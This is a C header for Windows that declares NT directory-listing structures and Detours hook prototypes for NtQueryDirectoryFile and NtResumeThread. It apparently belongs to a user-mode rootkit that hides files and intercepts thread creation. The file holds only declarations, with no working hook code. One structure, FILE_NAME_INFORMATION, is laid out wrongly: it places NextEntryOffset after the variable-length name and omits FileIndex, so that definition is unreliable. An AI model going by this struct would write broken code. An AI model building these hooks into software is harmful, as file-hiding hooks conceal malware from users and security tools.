#pragma once

#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#include "Detours.h"

#define STATUS_SUCCESS 0x00000000
#define STATUS_NO_SUCH_FILE	0xC000000F

typedef struct _FILE_BOTH_DIR_INFORMATION {
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
} *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	CCHAR         ShortNameLength;
	WCHAR         ShortName[12];
	LARGE_INTEGER FileId;
	WCHAR         FileName[1];
} *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	WCHAR         FileName[1];
} *PFILE_DIRECTORY_INFORMATION;					// MSDN !!

typedef struct _FILE_FULL_DIR_INFORMATION {
	ULONG         NextEntryOffset;
	ULONG         FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG         FileAttributes;
	ULONG         FileNameLength;
	ULONG         EaSize;
	WCHAR         FileName[1];
} *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_NAME_INFORMATION {
	ULONG FileNameLength;
	WCHAR FileName[1];
	ULONG NextEntryOffset;
} *PFILE_NAME_INFORMATION;

#define FileFullDirectoryInformation     2
#define FileBothDirectoryInformation	 3
#define FileNamesInformation            12
#define FileIdBothDirectoryInformation	37


typedef NTSTATUS(WINAPI* PrototypeDetourNtQueryDirectoryFile)(HANDLE FileHandle, HANDLE Event OPTIONAL, PVOID ApcRoutine OPTIONAL, PVOID ApcContext OPTIONAL, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName OPTIONAL, BOOLEAN RestartScan);

PrototypeDetourNtQueryDirectoryFile NewNtQueryDirectoryFile;


typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PTEB TebBaseAddress;
	CLIENT_ID ClientId;
	ULONG_PTR AffinityMask;
	LONG Priority;
	LONG BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;


typedef NTSTATUS(NTAPI* PrototypeDetourNtResumeThread)(HANDLE hThread, PULONG SuspendCount);

PrototypeDetourNtResumeThread NewNtResumeThread;
